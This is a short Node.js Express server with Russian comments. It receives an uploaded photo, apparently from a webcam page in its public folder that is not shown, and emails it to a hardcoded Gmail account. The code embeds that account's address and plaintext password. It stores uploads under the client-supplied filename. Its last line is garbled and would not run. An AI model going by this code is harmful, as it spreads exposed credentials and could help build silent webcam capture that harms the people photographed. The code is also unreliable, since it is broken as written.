const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');

const app = express();
const port = 3000;

app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

// Настройка хранилища для multer
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'uploads/');
    },
    filename: function (req, file, cb) {
        cb(null, Date.now() + '-' + file.originalname);
    }
});

const upload = multer({ storage: storage });

// Настройка отправки почты
const transporter = nodemailer.createTransport({
    service: 'gmail', // Можно использовать другой SMTP-сервис
    auth: {
        user: 'dmusaev711@gmail.com', // Ваша почта
        pass: 'dzhamal2007' // Ваш пароль
    }
});

// Обработка POST-запроса для отправки фото
app.post('/upload', upload.single('photo'), (req, res) => {
    const mailOptions = {
        from: 'dmusaev711@gmail.com',
        to: 'dmusaev711@gmail.com', // Куда отправлять фото
        subject: 'Новое фото с веб-камеры',
        text: 'Смотрите прикрепленное фото.',
        attachments: [
            {
                filename: req.file.filename,
                path: req.file.path
            }
        ]
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send(error.toString());
        }
        // Удалите файл после отправки
        fs.unlink(req.file.path, (err) => {
            if (err) console.error(err);
        });
        res.send('Фото отправлено на почту!');
    });
});

// Запуск сервера
app.listen(port, () => {
    console.log(127.0.0.1:5500/public/index.htmlaa});
});